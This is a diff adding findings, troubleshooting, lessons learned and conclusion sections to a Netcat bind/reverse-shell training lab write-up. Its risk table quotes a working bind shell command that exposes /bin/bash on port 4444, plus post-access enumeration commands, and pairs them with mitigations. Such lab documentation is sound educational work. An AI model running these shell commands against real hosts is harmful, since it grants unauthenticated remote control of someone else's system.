@@ -303,7 +303,7 @@ victim@target:~$ cat secret.txt                          # The received file was
 FLAG{advanced_netcat_file_transfer}
 
 ```
-
+## 9. Findings and Risk Table
 | **Tool Used** | **Technique Type** | **Command(s) Executed** | **Key Output / Observed Result** | **Insight Gained** | **Risk Level** | **Lessons Learned** | **Recommended Action / Mitigation** | **Conclusion** |
 | --- | --- | --- | --- | --- | --- | --- | --- | --- |
 | **Netcat (nc)** | Bind Shell (Victim listening, attacker connects) | `nc -l -p 4444 -e /bin/bash` (victim) `nc 192.168.56.210 4444` (attacker) | Attacker gained remote shell on victim; executed user, network, and file enumeration commands | A single exposed port allowed unrestricted command execution | **High** | Unprotected listening services enable instant system takeover | Block unauthorized listeners; enforce host firewalls; restrict shell binaries; enable monitoring | Demonstrated how bind shells grant full compromise with no authentication |
@@ -313,3 +313,43 @@ FLAG{advanced_netcat_file_transfer}
 | **Netcat (nc)** | Recon via reverse shell | Commands: `uname`, `whoami`, `pwd`, `ps`, `netstat` | Provided attacker system intelligence identical to bind shell | Reverse channel offers same privileges, executed covertly | **High** | Reverse shells are stealthier and harder to detect than bind shells | Deploy behavioral monitoring, disable unnecessary tools, enforce endpoint protection | Proved that reverse tunnels maintain access even with stricter network controls |
 | **Netcat (nc)** | Lack of command control safety | `ps aux` returned “Command not found” indicating limited environment | Shell still allowed full execution of standard commands | Misconfiguration or limited binaries did not prevent exploitation | **Medium** | Partial command restrictions do not mitigate risk without full system hardening | Apply application allow‑listing, remove netcat, enforce shell access control | Minimal restrictions proved insufficient when underlying shell remained active |
 | **Netcat (nc)** | Session termination handling | `exit` closed both sessions | Sessions closed immediately once attacker exited | No persistence mechanism existed | **Low** | Shells are temporary unless persistence is manually installed | Monitor logs for session start/end anomalies; disable netcat by policy | Shell closure demonstrated how attackers require persistence for lasting access |
+
+## 10. Troubleshooting
+When commands failed or services did not respond:
+
+- The current shell was validated using the command `echo $SHELL`
+- If incorrect, the **start_script.sh** was re-run
+- The lab state was verified again using `running`
+
+This ensured tool execution remained within the designated training environment.
+## 11. Summary and Lesson Learnt
+### Summary
+  - In this lab, Netcat was used to demonstrate how bind shells and reverse shells could be established between a victim and an attacker, resulting in unauthorized remote command execution. A listening service was configured on the victim system in the bind shell scenario, while in the reverse shell scenario, the victim system was made to initiate a connection back to the attacker. In both cases, shell access was successfully obtained without authentication.
+
+- System and network enumeration commands were executed through the established shells, revealing critical information such as operating system details, user identity, running processes, directory structures, and internal network configurations. It was observed that once shell access was gained, reconnaissance of the environment was performed within seconds.
+
+- It was further observed that firewall protections focused only on inbound traffic were ineffective against reverse shell connections, as outbound traffic was allowed without restriction. Even in environments where certain commands were unavailable, sufficient functionality remained to allow effective exploitation. The sessions were terminated upon exit, showing that persistence had not been established during the exercise.
+
+### Lessons Learned
+
+- It was learned that a single exposed listening port was sufficient to allow complete system compromise.
+
+- It was observed that reverse shells bypassed traditional firewall protections when outbound traffic filtering was not enforced.
+
+- It was demonstrated that system and network enumeration could be performed rapidly after gaining shell access.
+
+- It was noted that partial command restrictions did not prevent exploitation when full shell access was still available.
+
+- It was identified that internal network information was easily exposed through basic commands such as ifconfig and netstat, increasing the risk of lateral movement.
+
+- It was understood that shell sessions were temporary but could have been made persistent by an attacker within a short time.
+
+- It was recognized that legitimate tools like Netcat could be misused as backdoor mechanisms when not properly controlled.
+
+- It was concluded that host-based firewalls, application allow-listing, network segmentation, and continuous monitoring were critical defensive measures.
+
+## 11. Conclusion
+
+This lab demonstrated that both bind shells and reverse shells created using Netcat could result in full system compromise when adequate security controls were not in place. It was shown that attackers did not require sophisticated malware to gain access; instead, simple tools and weak configurations were sufficient.
+
+The exercise emphasized the importance of enforcing strict firewall policies that included both inbound and outbound traffic control, implementing endpoint protection, and applying system hardening practices. It was concluded that minor security oversights could lead to major security breaches, highlighting the need for proactive defensive strategies in all computing environments.
